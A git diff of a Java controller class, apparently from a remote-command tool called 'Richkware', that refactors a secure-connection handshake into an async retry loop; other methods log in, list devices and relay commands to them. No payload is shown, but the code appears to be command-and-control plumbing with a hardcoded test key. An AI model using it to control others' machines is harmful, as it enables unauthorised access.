@@ -24,8 +24,17 @@ import java.util.stream.Collectors;
 
 public class Controller {
 
+    private static final String SECURE_DATA_CLIENT = "secureDataClient";
+    private static final String CLIENT_KEY = "clientKey";
+    private static final String SERVER_RESPONSE = "serverResponse";
+
+    private static final int SECURE_CONNECTION_MAX_ATTEMPT = 5;
+
     private Network network;
     private Crypto.Client cryptoClient;
+    private String clientID;
+    private List<String> devicesList;
+    private Map<Device, SocketThread> devicesMap;
 
     public Controller() {
         network = new Network();
@@ -36,19 +45,8 @@ public class Controller {
         return network;
     }
 
-    /**
-     * REVERSE COMMAND (SERVER)
-     */
-
-    private List<String> devicesList;
-    /**
-     * DIRECT COMMANDS (SOCKET)
-     */
-
-    private Map<Device, SocketThread> devicesMap;
-
-    //DONE
     public void login(String email, String password, RichkwareCallback callback) {
+
         JSONObject payload = new JSONObject();
         payload.put("email", email);
         payload.put("password", password);
@@ -103,7 +101,6 @@ public class Controller {
         });
     }
 
-    //DONE
     public void devicesList(boolean encryption, ListCallback callback) throws ModelException {
         String sDevicesList = null;
         Gson gson = new Gson();
@@ -126,7 +123,6 @@ public class Controller {
         });
     }
 
-    //DONE
     public void connectDevice(Device device) {
         devicesList = new ArrayList<>();
         devicesList.add(device.getName());
@@ -183,10 +179,10 @@ public class Controller {
 //        }
 //    }
 
-    //DONE
     public void connectDevice(List<Device> devices) {
         devicesList = devices.stream().map(Device::getName).collect(Collectors.toList());
     }
+
 //
 //    private void reverseReturn(int i, Map<String, String> map, ReverseCommandCallback callback) {
 //        if (i == devicesList.size()-1){
@@ -198,7 +194,6 @@ public class Controller {
 //        }
 //    }
 
-    //DONE
     public void reverseCommand(String commands, boolean encryption, RichkwareCallback callback) {
         String[] commandsArray = commands.split("\n");
         String encodedCommands = "";
@@ -289,72 +284,62 @@ public class Controller {
         cryptoClient.reset();
     }
 
-    //todo rimuovere dipendenza da swing, ma fare barra con stato del jcrypto
-    public void initSecureConnection(String clientID, JLabel encStateValue) {
+    private void asyncInit(Map<String, Object> map, int attempt, RichkwareCallback callback) { //callback chiamata allo stato 3
+        String clientResponse = cryptoClient.init((File) map.get(SECURE_DATA_CLIENT), (String) map.get(CLIENT_KEY), (String) map.get(SERVER_RESPONSE));
+
+        Logger.i(clientResponse);
+
+        int clientState = new JSONObject(clientResponse).getInt("state");
+
+        JSONObject parametersJson = new JSONObject();
+        parametersJson.put("clientID", clientID);
+        parametersJson.put("data", new JSONObject(clientResponse).getString("payload"));
+
+        Logger.i("clientState: " + clientState);
+
+        getNetwork().getRequestCompat("secureConnection", parametersJson.toString(), new NetworkCallback() {
+            @Override
+            public void onSuccess(String response) {
+                if (attempt < SECURE_CONNECTION_MAX_ATTEMPT) {
+                    if (clientState != 3) {
+                        map.remove(SERVER_RESPONSE);
+                        map.put(SERVER_RESPONSE, response);
+                        Logger.i(map.get(SECURE_DATA_CLIENT) + " " + (String) map.get(CLIENT_KEY) + " " + (String) map.get(SERVER_RESPONSE));
+                        asyncInit(map, attempt + 1, callback);
+                    } else {
+                        //TODO chaiamata a se stesso se stato <3, oppure chiama callback
+                        callback.onSuccess(String.valueOf(clientState));
+                    }
+                } else {
+                    callback.onFailure("Connection timeout");
+                }
+            }
+
+            @Override
+            public void onFailure(Exception e) {
+                callback.onFailure(e.getMessage());
+            }
+        });
+    }
+
+    public void initSecureConnection(RichkwareCallback callback) {
         Logger.i("initSecureConnection...");
+
+        this.clientID = "RMC_001";
+
         //TODO verificare che non si leghi ad un unico server, altrimenti diverso file TXT, nome server nel file TXT
         // re-init to allow a connection to a different server
         cryptoClient = new Crypto.Client();
 
         File secureDataClient = new File("TESTsecureDataClient.txt");
         String clientKey = "testkeyClient";
-        int maxAttempts = 5;
-
-        String clientResponse = "";
         String serverResponse = "";
-        String clientPayload = "";
-        try {
 
-            int clientState = 0;
-            int i = 0;
-            do {
-                i++;
+        Map<String, Object> map = new HashMap<>();
+        map.put(SECURE_DATA_CLIENT, secureDataClient);
+        map.put(CLIENT_KEY, clientKey);
+        map.put(SERVER_RESPONSE, serverResponse);
 
-                clientResponse = cryptoClient.init(secureDataClient, clientKey, serverResponse);
-                clientState = new JSONObject(clientResponse).getInt("state");
-                clientPayload = new JSONObject(clientResponse).getString("payload");
-
-                Logger.i("clientState: " + clientState);
-                encStateValue.setText(clientState + "");
-                // do not contact the server if it is in the last state
-                // TODO non commentato per caricare crypto server in session server, solo li c'è init
-                //if (clientState == 3) break;
-                // connection
-
-                // TODO CAMBIA NEI NUOVI METODI
-                serverResponse = network.GetRequestSync("secureConnection?clientID=" + clientID + "&data=" + clientPayload);
-
-
-//                JSONObject jsonObject = new JSONObject();
-//                jsonObject.put("clientID", clientID);
-//                jsonObject.put("data", clientPayload);
-//
-//                network.getRequest("secureConnection", jsonObject.toString(), cryptoClient, new NetworkCallback() {
-//                    @Override
-//                    public void onSuccess(String response) {
-//                        if (ResponseParser.isStatusOK(response))
-//                            callback.onSuccess(ResponseParser.parseMessage(response));
-//                        else
-//                            callback.onFailure(ResponseParser.parseMessage(response));
-//
-//                        serverResponse = response;
-//                    }
-//
-//                    @Override
-//                    public void onFailure(Exception e) {
-//                        callback.onFailure(e.getMessage());
-//                    }
-//                });
-
-
-                // contatta il server solo una volta
-                if (clientState == 3) break;
-                //todo prevedi reset nel caso si cancelli il file
-
-            } while ((i < maxAttempts) /*&& (clientState != 3)*/);
-        } catch (NetworkException e) {
-            e.printStackTrace();
-        }
-        Logger.i("initSecureConnection done");
+        asyncInit(map, 0, callback);
     }
 }
